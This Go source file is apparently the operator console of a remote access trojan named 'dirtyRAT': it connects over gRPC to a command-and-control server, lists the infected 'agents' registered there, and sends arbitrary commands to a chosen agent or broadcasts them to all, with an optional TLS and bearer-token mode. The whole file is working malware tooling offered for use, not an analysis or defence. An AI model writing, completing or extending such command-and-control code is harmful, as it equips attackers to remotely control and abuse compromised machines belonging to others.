package command

import (
	"bufio"
	"context"
	"dirtyRAT/pkg/c2"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/grpc-ecosystem/go-grpc-middleware/v2/interceptors/logging"
	"github.com/grpc-ecosystem/go-grpc-middleware/v2/interceptors/retry"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
)

type tokenAuth struct {
	token string
}

func (t *tokenAuth) GetRequestMetadata(ctx context.Context, in ...string) (map[string]string, error) {
	if t.token == "" {
		// log
	}
	return map[string]string{
		"authorization": "Bearer " + t.token,
	}, nil
}

func (t *tokenAuth) RequireTransportSecurity() bool {
	return true // or false if unencrypted communication
}

func handleInput(reader *bufio.Reader) (string, []string, error) {
	input, err := reader.ReadString('\n')
	if err != nil {
		return "", nil, err
	}
	parts := strings.Fields(strings.TrimSpace(input))
	if len(parts) < 1 {
		return "", nil, fmt.Errorf("invalid input format")
	}
	return parts[0], parts[1:], nil
}

// Lists all active agents connected to the server
func listAgents(client c2.CommandAndControlClient) {
	response, err := client.ListAgents(context.Background(), &c2.Empty{})
	if err != nil {
		log.Printf("Failed to get list of agents: %v\n", err)
		return
	}
	fmt.Println("Registered Agents:")
	for _, agent := range response.Agents {
		fmt.Println(" -", agent.AgentID, agent.AgentName)
	}
}

func sendCommand(client c2.CommandAndControlClient, target string, cmd string, args []string) {
	log.Printf("Sending command: %s with arguments: %v to target: %s", cmd, args, target)
	broadcast := target == "broadcast"
	response, err := client.SendCommandToServer(context.Background(), &c2.CommandRequest{
		Command:   cmd,
		Arguments: args,
		Broadcast: broadcast,
		AgentID:   target,
	})
	if err != nil {
		log.Printf("Failed to send command: %v\n", err)
		return
	}
	log.Printf("Server responded with: %s\n", response.Status)
}

func interactiveCommandLoop(client c2.CommandAndControlClient) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("Enter command (format: [broadcast|AGENT_ID] COMMAND ARGUMENTS) or 'exit' to quit: ")
		target, parts, err := handleInput(reader)
		if err != nil {
			log.Printf("Error: %v\n", err)
			continue
		}

		if target == "list_agents" {
			listAgents(client)
			continue
		}

		if target == "exit" || target == "quit" {
			log.Println("User terminated the session.")
			log.Println("Exiting...")
			break
		}

		sendCommand(client, target, parts[0], parts[1:])
	}
}

func StartCmdCenter(address string) error {
	conn, err := grpc.Dial(address, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("Failed to establish connection: %v", err)
		return err
	}
	log.Printf("Connected successfully to server at %s", address)
	defer conn.Close()

	client := c2.NewCommandAndControlClient(conn)
	interactiveCommandLoop(client)
	return nil
}

func StartCmdCenterWithTLS(address string) error {
	creds, err := credentials.NewClientTLSFromFile("cert.pem", "")
	if err != nil {
		log.Fatalf("Failed to setup TLS: %v", err)
		return err
	}
	log.Println("TLS setup successful.")

	logger := log.New(os.Stderr, "", log.Ldate|log.Ltime|log.Lshortfile)
	opts := []logging.Option{
		logging.WithLogOnEvents(logging.StartCall, logging.FinishCall),
		// ... any other option you need
	}

	conn, err := grpc.Dial(
		address,
		grpc.WithTransportCredentials(creds),
		grpc.WithPerRPCCredentials(&tokenAuth{token: "your-authentication-token"}),
		grpc.WithChainUnaryInterceptor(
			logging.UnaryClientInterceptor(InterceptorLogger(logger), opts...),
			retry.UnaryClientInterceptor(retry.WithCodes(codes.Unavailable)), // example retry for Unavailable error
			// ... add other interceptors if needed
		),
	)

	if err != nil {
		log.Fatalf("Failed to establish connection: %v", err)
		return err
	}
	log.Printf("Connected successfully to server at %s", address)

	client := c2.NewCommandAndControlClient(conn)
	interactiveCommandLoop(client)
	return nil
}

// InterceptorLogger adapts standard Go logger to interceptor logger.
func InterceptorLogger(l *log.Logger) logging.Logger {
	return logging.LoggerFunc(func(_ context.Context, lvl logging.Level, msg string, fields ...any) {
		switch lvl {
		case logging.LevelDebug:
			msg = fmt.Sprintf("DEBUG :%v", msg)
		case logging.LevelInfo:
			msg = fmt.Sprintf("INFO :%v", msg)
		case logging.LevelWarn:
			msg = fmt.Sprintf("WARN :%v", msg)
		case logging.LevelError:
			msg = fmt.Sprintf("ERROR :%v", msg)
		default:
			panic(fmt.Sprintf("unknown level %v", lvl))
		}
		l.Println(append([]any{"msg", msg}, fields...))
	})
}
